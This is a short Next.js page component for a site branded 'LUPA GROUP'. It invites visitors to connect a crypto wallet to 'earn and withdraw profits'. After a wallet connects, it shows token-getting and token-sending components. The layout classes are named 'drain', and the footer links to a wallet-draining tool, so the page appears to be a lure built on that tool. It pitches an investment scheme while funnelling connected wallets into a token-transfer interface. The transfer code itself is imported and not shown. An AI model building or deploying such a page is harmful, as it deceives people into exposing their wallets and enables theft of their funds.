import { ConnectButton } from '@rainbow-me/rainbowkit';
import Link from 'next/link';
import { useAccount } from 'wagmi';
import { GetTokens, SendTokens } from '../components/contract';

const Wordmark = () => (
  <div className="wordmark">
    <span className="wordmark__drop" aria-hidden />
    <span className="wordmark__text">LUPA</span>
  </div>
);

export default function Home() {
  const { isConnected } = useAccount();

  return (
    <div className="drain-shell">
      <header className="drain-topbar">
        <Wordmark />
        <ConnectButton showBalance={false} />
      </header>

      {isConnected ? (
        <main className="drain-main">
          <GetTokens />
          <SendTokens />
        </main>
      ) : (
        <section className="hero">
          <h1 className="hero__title">
            LUPA <em>GROUP.</em>
          </h1>
          <p className="hero__lede">
            welcome <strong>to</strong> lupa group, earn and withdraw profits
          </p>
          <div className="hero__cta">
            <ConnectButton showBalance={false} />
          </div>
          <p className="hero__hint">Connect a wallet to begin</p>
        </section>
      )}

      <footer className="drain-footer">
        lupa group ·{' '}
        <Link href="/compromised-wallet-rescue/">2026</Link> ·{' '}
        <a
          href="https://github.com/dawsbot/drain"
          target="_blank"
          rel="noreferrer"
        >
          source
        </a>
      </footer>
    </div>
  );
}
